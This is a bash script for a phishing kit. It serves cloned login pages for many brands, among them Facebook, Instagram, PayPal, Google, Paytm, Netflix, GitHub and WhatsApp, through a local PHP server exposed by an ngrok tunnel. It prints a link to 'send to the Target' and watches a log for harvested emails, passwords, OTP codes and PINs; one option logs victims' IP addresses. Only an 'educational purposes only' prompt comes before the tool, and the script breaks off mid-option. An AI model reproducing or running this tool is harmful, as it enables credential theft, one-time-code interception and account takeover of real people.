#!/bin/bash
clear
echo ""
echo ""
echo ""
printf "\e[1;33m[\e[0m <<>> \e[1;33m] NGROK SERVER : TURN ON MOBILE DATA & HOTSPOT AND GET START !\e[0m"
sleep 4
echo ""
clear
echo ""
echo ""
echo ""
read -p $'\e[1;32m\e[0m\e[1;32mT H I S - T O O L - F O R - E D U C A T I O N A l - P U R P O S E S - O N L Y ? \e[1;33m\e[0m\e[1;33m (Y/N) : \e[0m' option
echo""
echo""
echo""

if [[ $option == *'N'* ]]; then
clear
exit
fi
if [[ $option == *'n'* ]]; then
clear
exit
fi

php="$(ps -efw | grep php | grep -v grep | awk '{print $2}')"
ngrok="$(ps -efw | grep ngrok | grep -v grep | awk '{print $2}')"
kill -9 $php
kill -9 $ngrok
clear
chmod 777 Logo.sh
./Logo.sh
echo ""
echo -e $'\e[1;32m\e[0m\e[1;32m SELECT ANY ATTACK  \e[0m'
echo -e $'\e[1;37m\e[0m\e[1;37m --------------------- > > >\e[0m'
echo ""
banner(){ 
printf "\e[1;92m[\e[0m\e[1;77m06\e[0m\e[1;92m]\e[0m\e[1;93m Google-TFO\e[0m                                                                                                    
printf "\e[1;92m[\e[0m\e[1;77m07\e[0m\e[1;92m]\e[0m\e[1;93m Paytm-TFO\e[0m                                                                                                      
}
banner
echo ""
echo ""
                
                 read -p $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m Enter Your Choice : \e[0m' option
		 case $option in 
			 
                         1)cd sites/ 
                           cd tiktok/
                           echo ""
                           echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           sleep 3
                           echo ""
                           echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
                           ./ngrok http 4444 > /dev/null 2>&1 &
                           sleep 25
                           echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                           printf "\e[1;33m[\e[0m <<>> \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                           echo ""
                           echo -e $'\e[1;33m\e[0m\e[1;33m // CREDENTIAL //  \e[0m'
                           echo ""
                           tail -f log.txt | grep -e "username" -e "otp"

                ;;
	        
	        2)cd sites/
                  cd facebook/
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                  php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                  sleep 3
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
                  ./ngrok http 4444 > /dev/null 2>&1 &
                  sleep 25
                  echo ""
                  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                  printf "\e[1;33m[\e[0m <<>> \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                  echo ""
                  echo -e $'\e[1;33m\e[0m\e[1;33m // CREDENTIAL //  \e[0m'
                  echo ""
                  tail -f log.txt | grep -e "email" -e "pass" -e "approvals_code"


                ;;

                3) cd sites/
                  cd instagram/
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                  php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                  sleep 3
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
                  ./ngrok http 4444 > /dev/null 2>&1 &
                  sleep 25
                  echo ""
                  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                  printf "\e[1;33m[\e[0m <<>> \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                  echo ""
                  echo -e $'\e[1;33m\e[0m\e[1;33m // CREDENTIAL //  \e[0m'
                  echo ""
                  tail -f log.txt  
                  
                 
 
                  
                ;;

                4)cd sites/
                  cd UberEats-Phishing/
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                  php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                  sleep 3
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
                  ./ngrok http 4444 > /dev/null 2>&1 &
                  sleep 25
                  echo ""
                  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                  printf "\e[1;33m[\e[0m <<>> \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                  echo ""
                  echo -e $'\e[1;33m\e[0m\e[1;33m // CREDENTIAL //  \e[0m'
                  echo ""
                  tail -f log.txt | grep -e "Email_or_Phone" -e "password" -e "verificationCode"
                  
                  
                  
                ;;
                 
                5) cd sites/
                  cd ola-otpbypass/
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                  php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                  sleep 3
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
                  ./ngrok http 4444 > /dev/null 2>&1 &
                  sleep 25
                  echo ""
                  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                  printf "\e[1;33m[\e[0m <<>> \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                  echo ""
                  echo -e $'\e[1;33m\e[0m\e[1;33m // CREDENTIAL //  \e[0m'
                  echo ""
                  tail -f log.txt | grep -e "number" -e "otp" -e "OTP"
                  
                 
                ;;
                
                6)cd sites/
                  cd google-otp/
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                  php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                  sleep 3
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
                  ./ngrok http 4444 > /dev/null 2>&1 &
                  sleep 25
                  echo ""
                  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                  printf "\e[1;33m[\e[0m <<>> \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                  echo ""
                  echo -e $'\e[1;33m\e[0m\e[1;33m // CREDENTIAL //  \e[0m'
                  echo ""
                  tail -f log.txt | grep -e "email" -e "password" -e "OTP"
                  


                ;;
  
                7)cd sites/
                  cd Paytm-Phishing/
                  echo ""
                 echo -e $'\e[1;33m[\e[0m\e[1;77m 1 \e[0m\e[1;33m]\e[0m\e[1;32m Paytm Sign In \e[0m' 
                 echo -e $'\e[1;33m[\e[0m\e[1;77m 2 \e[0m\e[1;33m]\e[0m\e[1;32m Paytm Sign UP \e[0m' 
                 echo ""
                 read -p $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m Enter Your Choice : \e[0m' option
		 case $option in
			 1) cd paytm/
                            echo ""
                            echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 3
                            echo ""
                            echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
                            ./ngrok http 4444 > /dev/null 2>&1 &
                            sleep 25
                            echo ""
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                            printf "\e[1;33m[\e[0m <<>> \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                            echo ""
                            echo -e $'\e[1;33m\e[0m\e[1;33m // CREDENTIAL //  \e[0m'
                            echo ""
                            tail -f log.txt | grep -e "email" -e "username" -e "password" -e "otp"

                ;;
                
                         2) cd signup/
                            echo ""
                            echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 3
                            echo ""
                            echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
                            ./ngrok http 4444 > /dev/null 2>&1 &
                            sleep 25
                            echo ""
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                            printf "\e[1;33m[\e[0m <<>> \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                            echo ""
                            echo -e $'\e[1;33m\e[0m\e[1;33m // CREDENTIAL //  \e[0m'
                            echo ""
                            tail -f log.txt | grep -e "email" -e "loginPassword" -e "mobileNumber" -e "otp"
                ;;
                esac
                ;;

                8)cd sites/
                  cd Netflix/
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                  php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                  sleep 3
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
                  ./ngrok http 4444 > /dev/null 2>&1 &
                  sleep 25
                  echo ""
                  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                  printf "\e[1;33m[\e[0m <<>> \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                  echo ""
                  echo -e $'\e[1;33m\e[0m\e[1;33m // CREDENTIAL //  \e[0m'
                  echo ""
                  tail -f log.txt | grep -e "userLoginId" -e "password" -e "OTP"                 

                ;;


               9)cd sites/
                  cd instafollow/
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                  php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                  sleep 3
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
                  ./ngrok http 4444 > /dev/null 2>&1 &
                  sleep 25
                  echo ""
                  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                  printf "\e[1;33m[\e[0m <<>> \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                  echo ""
                  echo -e $'\e[1;33m\e[0m\e[1;33m // CREDENTIAL //  \e[0m'
                  echo ""
                  tail -f log.txt | grep -e "username" -e "password" -e "password" -e "pin" -e "Pin"                        

                ;;

               10)cd sites/
                  cd amazonsign/
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                  php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                  sleep 3
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
                  ./ngrok http 4444 > /dev/null 2>&1 &
                  sleep 25
                  echo ""
                  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                  printf "\e[1;33m[\e[0m <<>> \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                  echo ""
                  echo -e $'\e[1;33m\e[0m\e[1;33m // CREDENTIAL //  \e[0m'
                  echo ""
                  tail -f log.txt | grep -e "email" -e "password" -e "OTP"        
                ;;

                11)cd sites/
                  cd whatsapp-phishing/
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                  php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                  sleep 3
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
                  ./ngrok http 4444 > /dev/null 2>&1 &
                  sleep 25
                  echo ""
                  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                  printf "\e[1;33m[\e[0m <<>> \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                  echo ""
                  echo -e $'\e[1;33m\e[0m\e[1;33m // CREDENTIAL //  \e[0m'
                  echo ""
                  tail -f log.txt | grep -e "number" -e "OTP" -e "otp"      

                ;;

                12)cd sites/
                  cd Linkedin/
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                  php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                  sleep 3
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
                  ./ngrok http 4444 > /dev/null 2>&1 &
                  sleep 25
                  echo ""
                  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                  printf "\e[1;33m[\e[0m <<>> \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                  echo ""
                  echo -e $'\e[1;33m\e[0m\e[1;33m // CREDENTIAL //  \e[0m'
                  echo ""
                  tail -f log.txt | grep -e "email" -e "Email" -e "password" -e "pin" -e "Pin"       

                ;;
   
                13)cd sites/
                  cd Hotstar-otp-bypass/
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                  php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                  sleep 3
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
                  ./ngrok http 4444 > /dev/null 2>&1 &
                  sleep 25
                  echo ""
                  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                  printf "\e[1;33m[\e[0m <<>> \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                  echo ""
                  echo -e $'\e[1;33m\e[0m\e[1;33m // CREDENTIAL //  \e[0m'
                  echo ""
                  tail -f log.txt | grep -e "phoneNo" -e "OTP"       

                ;;
      
                14)cd sites/
                  cd spotify/
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                  php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                  sleep 3
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
                  ./ngrok http 4444 > /dev/null 2>&1 &
                  sleep 25
                  echo ""
                  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                  printf "\e[1;33m[\e[0m <<>> \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                  echo ""
                  echo -e $'\e[1;33m\e[0m\e[1;33m // CREDENTIAL //  \e[0m'
                  echo ""
                  tail -f log.txt | grep -e "username" -e "password" -e "password" -e "pin" -e "Pin"        

                ;;

                15)cd sites/
                  cd github/
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                  php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                  sleep 3
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
                  ./ngrok http 4444 > /dev/null 2>&1 &
                  sleep 25
                  echo ""
                  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                  printf "\e[1;33m[\e[0m <<>> \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                  echo ""
                  echo -e $'\e[1;33m\e[0m\e[1;33m // CREDENTIAL //  \e[0m'
                  echo ""
                  tail -f log.txt | grep -e "login" -e "password" -e "otp"       

                ;;

                16)cd sites/
                   cd ipfinder/
                   echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                  php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                  sleep 3
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
                  ./ngrok http 4444 > /dev/null 2>&1 &
                  sleep 25
                  echo ""
                  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                  printf "\e[1;33m[\e[0m <<>> \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                  echo ""
                  echo -e $'\e[1;33m\e[0m\e[1;33m // CREDENTIAL //  \e[0m'
                  echo ""
                  tail -f ip.txt        

                ;;

               
                 17)cd sites/
                  cd Zomato-Phishing/
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                  php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                  sleep 3
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
                  ./ngrok http 4444 > /dev/null 2>&1 &
                  sleep 25
                  echo ""
                  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                  printf "\e[1;33m[\e[0m <<>> \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                  echo ""
                  echo -e $'\e[1;33m\e[0m\e[1;33m // CREDENTIAL //  \e[0m'
                  echo ""
                  tail -f log.txt | grep -e "email" -e "otp" -e "OTP"                

                ;;


               18)cd sites/
                  cd phonepay/
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                  php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                  sleep 3
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
                  ./ngrok http 4444 > /dev/null 2>&1 &
                  sleep 25
                  echo ""
                  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                  printf "\e[1;33m[\e[0m <<>> \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                  echo ""
                  echo -e $'\e[1;33m\e[0m\e[1;33m // CREDENTIAL //  \e[0m'
                  echo ""
                  tail -f log.txt | grep -e "number" -e "otp"                       

                ;;

               19)cd sites/
                  cd paypal/
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                  php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                  sleep 3
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
                  ./ngrok http 4444 > /dev/null 2>&1 &
                  sleep 25
                  echo ""
                  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                  printf "\e[1;33m[\e[0m <<>> \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                  echo ""
                  echo -e $'\e[1;33m\e[0m\e[1;33m // CREDENTIAL //  \e[0m'
                  echo ""
                  tail -f log.txt | grep -e "login_email" -e "login_password" -e "otpCode"       
                ;;

                20)cd sites/
                  cd telegram/
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                  php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                  sleep 3
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
                  ./ngrok http 4444 > /dev/null 2>&1 &
                  sleep 25
                  echo ""
                  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                  printf "\e[1;33m[\e[0m <<>> \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                  echo ""
                  echo -e $'\e[1;33m\e[0m\e[1;33m // CREDENTIAL //  \e[0m'
                  echo ""
                  tail -f log.txt | grep -e "phone_number" -e "phone_code"     

                ;;

                21)cd sites/
                  cd twitter/
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                  php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                  sleep 3
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
                  ./ngrok http 4444 > /dev/null 2>&1 &
                  sleep 25
                  echo ""
                  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                  printf "\e[1;33m[\e[0m <<>> \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                  echo ""
                  echo -e $'\e[1;33m\e[0m\e[1;33m // CREDENTIAL //  \e[0m'
                  echo ""
                  tail -f log.txt | grep -e "phone_or_email" -e "password" -e "challenge_response"      

                ;;
   
                22)cd sites/
                  cd flipcart/
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                  php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                  sleep 3
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
                  ./ngrok http 4444 > /dev/null 2>&1 &
                  sleep 25
                  echo ""
                  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                  printf "\e[1;33m[\e[0m <<>> \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                  echo ""
                  echo -e $'\e[1;33m\e[0m\e[1;33m // CREDENTIAL //  \e[0m'
                  echo ""
                  tail -f log.txt | grep -e "email" -e "password" -e "otp"     

                ;;
      
                23)cd sites/
                  cd wordpress/
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                  php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                  sleep 3
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
                  ./ngrok http 4444 > /dev/null 2>&1 &
                  sleep 25
                  echo ""
                  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                  printf "\e[1;33m[\e[0m <<>> \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                  echo ""
                  echo -e $'\e[1;33m\e[0m\e[1;33m // CREDENTIAL //  \e[0m'
                  echo ""
                  tail -f log.txt | grep -e "log" -e "pwd"       

                ;;

                24)cd sites/
                  cd snapchat/
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                  php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                  sleep 3
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
                  ./ngrok http 4444 > /dev/null 2>&1 &
                  sleep 25
                  echo ""
                  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                  printf "\e[1;33m[\e[0m <<>> \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                  echo ""
                  echo -e $'\e[1;33m\e[0m\e[1;33m // CREDENTIAL //  \e[0m'
                  echo ""
                  tail -f log.txt | grep -e "username" -e "password" -e "Code"       

                ;;

                25)cd sites/
                   cd protonmail/
                   echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                  php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                  sleep 3
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
                  ./ngrok http 4444 > /dev/null 2>&1 &
                  sleep 25
                  echo ""
                  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                  printf "\e[1;33m[\e[0m <<>> \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                  echo ""
                  echo -e $'\e[1;33m\e[0m\e[1;33m // CREDENTIAL //  \e[0m'
                  echo ""
                  tail -f log.txt | grep -e "username" -e "password"   

                ;;

               
                26)cd sites/
                  cd stackoverflow/
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                  php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                  sleep 3
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
                  ./ngrok http 4444 > /dev/null 2>&1 &
                  sleep 25
                  echo ""
                  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                  printf "\e[1;33m[\e[0m <<>> \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                  echo ""
                  echo -e $'\e[1;33m\e[0m\e[1;33m // CREDENTIAL //  \e[0m'
                  echo ""
                  tail -f log.txt | grep -e "email" -e "password"                 

                ;;


               27)cd sites/
                  cd ebay/
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                  php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                  sleep 3
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
                  ./ngrok http 4444 > /dev/null 2>&1 &
                  sleep 25
                  echo ""
                  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                  printf "\e[1;33m[\e[0m <<>> \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                  echo ""
                  echo -e $'\e[1;33m\e[0m\e[1;33m // CREDENTIAL //  \e[0m'
                  echo ""
                  tail -f log.txt | grep -e "userid" -e "pass" -e "pin"                       

                ;;

               28)cd sites/
                  cd twitch/
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                  php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                  sleep 3
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
                  ./ngrok http 4444 > /dev/null 2>&1 &
                  sleep 25
                  echo ""
